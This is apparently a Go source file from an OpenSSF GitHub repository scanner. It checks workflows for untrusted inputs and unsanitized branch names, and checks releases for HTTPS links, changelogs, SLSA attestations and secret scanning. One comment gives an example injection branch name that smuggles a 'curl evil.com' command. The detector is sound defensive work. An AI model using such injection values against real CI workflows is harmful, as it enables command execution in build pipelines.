package build_release

import (
	"fmt"
	"regexp"
	"strings"

	"github.com/gemaraproj/go-gemara"
	"github.com/ossf/si-tooling/v2/si"
	"github.com/rhysd/actionlint"

	"github.com/ossf/pvtr-github-repo-scanner/data"
)

// Pre-compiled patterns used by workflow security checks.
var (
	// https://securitylab.github.com/resources/github-actions-untrusted-input/
	// List of untrusted inputs; Global for use in tests also
	untrustedVars = regexp.MustCompile(`.*(github\.event\.issue\.title|` +
		`github\.event\.issue\.body|` +
		`github\.event\.pull_request\.title|` +
		`github\.event\.pull_request\.body|` +
		`github\.event\.comment\.body|` +
		`github\.event\.review\.body|` +
		`github\.event\.pages.*\.page_name|` +
		`github\.event\.commits.*\.message|` +
		`github\.event\.head_commit\.message|` +
		`github\.event\.head_commit\.author\.email|` +
		`github\.event\.head_commit\.author\.name|` +
		`github\.event\.commits.*\.author\.email|` +
		`github\.event\.commits.*\.author\.name|` +
		`github\.event\.pull_request\.head\.ref|` +
		`github\.event\.pull_request\.head\.label|` +
		`github\.event\.pull_request\.head\.repo\.default_branch|` +
		`github\.head_ref).*`)

	// Branch name variables that could be used unsafely in workflow run steps.
	// These are attacker-controllable when a PR is opened from a fork.
	// When used directly in a run: step, GitHub textually injects the branch name
	// into the shell script before execution, allowing command injection via
	// a malicious branch name (e.g. a branch named: feature"; curl evil.com; echo ").
	alwaysUnsafeBranchVars = regexp.MustCompile(`.*(github\.head_ref|` +
		`github\.base_ref|` +
		`github\.event\.pull_request\.head\.ref|` +
		`github\.event\.pull_request\.base\.ref).*`)

	// Branch ref variables that are only attacker-controllable in
	// pull_request-triggered workflows. Checked separately so we can
	// skip them for push-triggered workflows and avoid false positives.
	pullRequestOnlyUnsafeBranchVars = regexp.MustCompile(`.*(github\.ref\b|` +
		`github\.ref_name).*`)
)

// checkAllWorkflows fetches the repository's workflow files and evaluates each
// one with checkWorkflow. passMessage is returned when all files pass.
func checkAllWorkflows(payload data.Payload, checkWorkflow func(*actionlint.Workflow) (bool, string), passMessage string) (gemara.Result, string, gemara.ConfidenceLevel) {
	var confidence gemara.ConfidenceLevel

	workflows, err := payload.GetWorkflowFiles()
	if len(workflows) == 0 {
		message := "No workflows found in .github/workflows directory"
		if err != nil {
			message = err.Error()
		}
		return gemara.NotApplicable, message, confidence
	}

	return evaluateWorkflows(workflows, checkWorkflow, passMessage)
}

// evaluateWorkflows applies checkWorkflow to each parsed workflow.
//
// A file we could not retrieve or parse is reported as NeedsReview, not Failed.
// Failed asserts that the repository violates the control, which we have not
// observed for a file we never read; NeedsReview says so honestly and puts it in
// front of a human. An actual violation in a file we did parse still wins, so
// unreadable siblings can never mask a real finding.
func evaluateWorkflows(workflows []data.WorkflowFile, checkWorkflow func(*actionlint.Workflow) (bool, string), passMessage string) (gemara.Result, string, gemara.ConfidenceLevel) {
	var confidence gemara.ConfidenceLevel
	var uninspected []string

	for _, file := range workflows {
		if !strings.HasSuffix(file.Name, ".yml") && !strings.HasSuffix(file.Name, ".yaml") {
			continue
		}

		if file.Truncated {
			uninspected = append(uninspected, fmt.Sprintf("%s (too large to retrieve)", file.Path))
			continue
		}

		workflow, actionError := actionlint.Parse([]byte(file.Content))
		if actionError != nil {
			uninspected = append(uninspected, fmt.Sprintf("%s (%v)", file.Path, actionError))
			continue
		}

		ok, message := checkWorkflow(workflow)
		if !ok {
			return gemara.Failed, message, confidence
		}
	}

	if len(uninspected) > 0 {
		return gemara.NeedsReview, fmt.Sprintf(
			"Unable to evaluate %d of %d workflow files, manual review required: %s",
			len(uninspected), len(workflows), strings.Join(uninspected, "; ")), confidence
	}

	return gemara.Passed, passMessage, confidence
}

func CicdSanitizedInputParameters(payload data.Payload) (gemara.Result, string, gemara.ConfidenceLevel) {
	return checkAllWorkflows(payload, checkWorkflowFileForUntrustedInputs,
		"GitHub Workflows variables do not contain untrusted inputs")
}

func CicdBranchNameSanitized(payload data.Payload) (gemara.Result, string, gemara.ConfidenceLevel) {
	return checkAllWorkflows(payload, checkWorkflowFileForBranchNameUsage,
		"GitHub Workflows do not use unsanitized branch names in run steps")
}

// checkWorkflowFileForBranchNameUsage checks a workflow for unsanitized branch name
// variables used directly in run: steps, which can lead to command injection.
// It applies two levels of checking:
//   - alwaysUnsafeBranchVars: flagged regardless of trigger type (e.g. github.head_ref)
//   - pullRequestOnlyUnsafeBranchVars: only flagged when the workflow has a
//     pull_request or pull_request_target trigger (e.g. github.ref, github.ref_name)
func checkWorkflowFileForBranchNameUsage(workflow *actionlint.Workflow) (bool, string) {

	// Determine if the workflow is triggered by pull request events,
	// which makes github.ref and github.ref_name attacker-controllable.
	hasPullRequestTrigger := false
	for _, event := range workflow.On {
		if event.EventName() == "pull_request" || event.EventName() == "pull_request_target" {
			hasPullRequestTrigger = true
			break
		}
	}

	var message strings.Builder

	for _, job := range workflow.Jobs {
		if job == nil {
			continue
		}

		for _, step := range job.Steps {
			if step == nil {
				continue
			}

			run, ok := step.Exec.(*actionlint.ExecRun)
			if !ok || run.Run == nil {
				continue
			}

			varList := pullVariablesFromScript(run.Run.Value)

			for _, name := range varList {
				nameBytes := []byte(name)
				if alwaysUnsafeBranchVars.Match(nameBytes) {
					fmt.Fprintf(&message, "Unsanitized branch name variable found: %v\n", name)
				} else if hasPullRequestTrigger && pullRequestOnlyUnsafeBranchVars.Match(nameBytes) {
					fmt.Fprintf(&message, "Attacker-controllable ref variable in pull_request workflow: %v\n", name)
				}
			}
		}
	}

	if message.Len() > 0 {
		return false, message.String()
	}
	return true, ""
}

// checkWorkflowFileForUntrustedInputs checks a workflow for known untrusted
// GitHub Actions context variables used directly in run: steps.
// These variables (e.g. issue titles, PR bodies, commit messages) are
// user-controllable and can lead to command injection when interpolated
// into shell scripts without sanitization.
func checkWorkflowFileForUntrustedInputs(workflow *actionlint.Workflow) (bool, string) {

	var message strings.Builder

	for _, job := range workflow.Jobs {
		if job == nil {
			continue
		}

		for _, step := range job.Steps {
			if step == nil {
				continue
			}

			// Only run: steps are vulnerable; action steps use inputs safely.
			run, ok := step.Exec.(*actionlint.ExecRun)
			if !ok || run.Run == nil {
				continue
			}

			// Extract all ${{ ... }} expressions and check against known untrusted inputs.
			varList := pullVariablesFromScript(run.Run.Value)

			for _, name := range varList {
				if untrustedVars.Match([]byte(name)) {
					fmt.Fprintf(&message, "Untrusted input found: %v\n", name)
				}
			}
		}
	}

	if message.Len() > 0 {
		return false, message.String()
	}
	return true, ""

}

// pullVariablesFromScript extracts GitHub Actions expression names from a shell script.
// It finds all ${{ ... }} interpolations and returns the trimmed variable names.
// For example, given `echo ${{ github.head_ref }}`, it returns ["github.head_ref"].
func pullVariablesFromScript(script string) []string {

	varlist := []string{}

	for {

		start := strings.Index(script, "${{")
		if start == -1 {
			break
		}

		end := strings.Index(script[start:], "}}")
		if end == -1 {
			return nil
		}

		varlist = append(varlist, strings.TrimSpace(script[start+3:start+end]))

		script = script[start+end:]

	}

	return varlist

}

func ReleaseHasUniqueIdentifier(payload data.Payload) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
	var noNameCount int
	var sameNameFound []string
	var releaseNames = make(map[string]int)

	for _, release := range payload.Releases {
		if release.Name == "" {
			noNameCount++
		} else if _, ok := releaseNames[release.Name]; ok {
			sameNameFound = append(sameNameFound, release.Name)
		} else {
			releaseNames[release.Name] = release.Id
		}
	}
	if noNameCount > 0 || len(sameNameFound) > 0 {
		sameNames := strings.Join(sameNameFound, ", ")
		message := []string{fmt.Sprintf("Found %v releases with no name", noNameCount)}
		if len(sameNameFound) > 0 {
			message = append(message, fmt.Sprintf("Found %v releases with the same name: %v", len(sameNameFound), sameNames))
		}
		return gemara.Failed, strings.Join(message, ". "), confidence
	}
	return gemara.Passed, "All releases found have a unique name", confidence
}

func getLinks(payload data.Payload) []string {
	ins := payload.Insights
	var links []string

	addURL := func(u si.URL) { links = append(links, string(u)) }
	addURLPtr := func(u *si.URL) {
		if u != nil {
			links = append(links, string(*u))
		}
	}

	addURL(ins.Header.URL)
	addURLPtr(ins.Header.ProjectSISource)
	addURLPtr(ins.Project.HomePage)
	addURLPtr(ins.Project.Roadmap)
	addURLPtr(ins.Project.Funding)
	addURLPtr(ins.Project.Documentation.DetailedGuide)
	addURLPtr(ins.Project.Documentation.CodeOfConduct)
	addURLPtr(ins.Project.Documentation.QuickstartGuide)
	addURLPtr(ins.Project.Documentation.ReleaseProcess)
	addURLPtr(ins.Project.Documentation.SignatureVerification)
	addURLPtr(ins.Project.VulnerabilityReporting.BugBountyProgram)
	addURLPtr(ins.Project.VulnerabilityReporting.Policy)
	addURL(ins.Repository.Url)
	addURL(ins.Repository.License.Url)
	addURLPtr(ins.Repository.SecurityPosture.Assessments.Self.Evidence)

	if payload.RepositoryMetadata.OrganizationBlogURL() != nil {
		links = append(links, *payload.RepositoryMetadata.OrganizationBlogURL())
	}
	for _, repo := range ins.Project.Repositories {
		addURL(repo.Url)
	}
	for _, assessment := range ins.Repository.SecurityPosture.Assessments.ThirdPartyAssessment {
		addURLPtr(assessment.Evidence)
	}
	for _, tool := range ins.Repository.SecurityPosture.Tools {
		if tool.Results.Adhoc != nil {
			addURL(tool.Results.Adhoc.Location)
		}
		if tool.Results.CI != nil {
			addURL(tool.Results.CI.Location)
		}
		if tool.Results.Release != nil {
			addURL(tool.Results.Release.Location)
		}
	}
	return links
}

func insecureURI(uri string) bool {
	if strings.TrimSpace(uri) == "" ||
		strings.HasPrefix(uri, "https://") ||
		strings.HasPrefix(uri, "ssh:") ||
		strings.HasPrefix(uri, "git:") ||
		strings.HasPrefix(uri, "git@") {
		return false
	}
	return true
}

func EnsureInsightsLinksUseHTTPS(payload data.Payload) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
	links := getLinks(payload)
	var badURIs []string
	for _, link := range links {
		if insecureURI(link) {
			badURIs = append(badURIs, link)
		}
	}
	if len(badURIs) > 0 {
		return gemara.Failed, fmt.Sprintf("The following links do not use HTTPS: %v", strings.Join(badURIs, ", ")), confidence
	}
	return gemara.Passed, "All links use HTTPS", confidence
}

// changelogFileNames are repository-root basenames (lower-cased, extension
// stripped) that conventionally hold change-log content.
var changelogFileNames = map[string]bool{
	"changelog":     true,
	"changes":       true,
	"history":       true,
	"news":          true,
	"releasenotes":  true,
	"release_notes": true,
}

// changelogFileExtensions are the extensions accepted alongside the names above.
// The empty string covers extension-less files such as a bare CHANGELOG.
var changelogFileExtensions = map[string]bool{
	"":     true,
	".md":  true,
	".rst": true,
	".txt": true,
}

// changelogReleaseMarkers are case-insensitive substrings in a release
// description that indicate change-log content. They cover hand-written notes
// as well as the headings and compare link GitHub emits for auto-generated
// release notes ("## What's Changed" ... "**Full Changelog**: .../compare/...").
var changelogReleaseMarkers = []string{
	"changelog",
	"change log",
	"what's changed",
	"release notes",
	"/compare/",
}

// hasChangelogFile reports whether the repository root tree contains a file
// whose name matches a recognized change-log convention. It reads the tree
// already present in the payload, so it costs no additional API calls.
func hasChangelogFile(payload data.Payload) bool {
	for _, entry := range payload.Repository.Object.Tree.Entries {
		if entry.Type != "blob" {
			continue
		}
		name := strings.ToLower(entry.Name)
		ext := ""
		if dot := strings.LastIndex(name, "."); dot != -1 {
			ext = name[dot:]
			name = name[:dot]
		}
		if changelogFileNames[name] && changelogFileExtensions[ext] {
			return true
		}
	}
	return false
}

// releaseDescribesChanges reports whether a release description contains any
// recognized change-log marker (case-insensitive).
func releaseDescribesChanges(description string) bool {
	lower := strings.ToLower(description)
	for _, marker := range changelogReleaseMarkers {
		if strings.Contains(lower, marker) {
			return true
		}
	}
	return false
}

// EnsureLatestReleaseHasChangelog assesses whether the project documents what
// changed in its releases. Passed means we observed change-log content (a
// changelog file in the repo root, or recognizable content in the latest
// release notes); NeedsReview means the release carries a description a human
// should judge; Failed means a release exists with no change documentation at
// all. The HasMadeReleases guard in the chain ensures a release exists.
func EnsureLatestReleaseHasChangelog(payload data.Payload) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
	if hasChangelogFile(payload) {
		return gemara.Passed, "Changelog file found in repository root", gemara.Medium
	}

	description := payload.Repository.LatestRelease.Description
	if releaseDescribesChanges(description) {
		return gemara.Passed, "Changelog content found in latest release notes", gemara.High
	}

	if strings.TrimSpace(description) == "" {
		return gemara.Failed, "The latest release has no description and no changelog file was found in the repository root", gemara.Medium
	}

	return gemara.NeedsReview, "The latest release description has no recognized changelog markers; manual review required", gemara.Low
}

func InsightsHasSlsaAttestation(payload data.Payload) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
	attestations := payload.Insights.Repository.ReleaseDetails.Attestations

	for _, attestation := range attestations {
		if attestation.PredicateURI == "https://slsa.dev/provenance/v1" {
			return gemara.Passed, "Found SLSA attestation in security insights", confidence
		}
	}
	return gemara.Failed, "No SLSA attestation found in security insights", confidence
}

func DistributionPointsUseHTTPS(payload data.Payload) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
	distributionPoints := payload.Insights.Repository.ReleaseDetails.DistributionPoints

	if len(distributionPoints) == 0 {
		return gemara.NotApplicable, "No official distribution points found in Security Insights data", confidence
	}

	var badURIs []string
	for _, point := range distributionPoints {
		if insecureURI(point.Uri) {
			badURIs = append(badURIs, point.Uri)
		}
	}
	if len(badURIs) > 0 {
		return gemara.Failed, fmt.Sprintf("The following distribution points do not use HTTPS: %v", strings.Join(badURIs, ", ")), confidence
	}
	return gemara.Passed, "All distribution points use HTTPS", confidence
}

func SecretScanningInUse(payload data.Payload) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
	if payload.SecurityPosture.PreventsPushingSecrets() && payload.SecurityPosture.ScansForSecrets() {
		return gemara.Passed, "Secret scanning is enabled and prevents pushing secrets", confidence
	} else if payload.SecurityPosture.PreventsPushingSecrets() || payload.SecurityPosture.ScansForSecrets() {
		return gemara.Failed, "Secret scanning is only partially enabled", confidence
	} else {
		return gemara.Failed, "Secret scanning is not enabled", confidence
	}
}
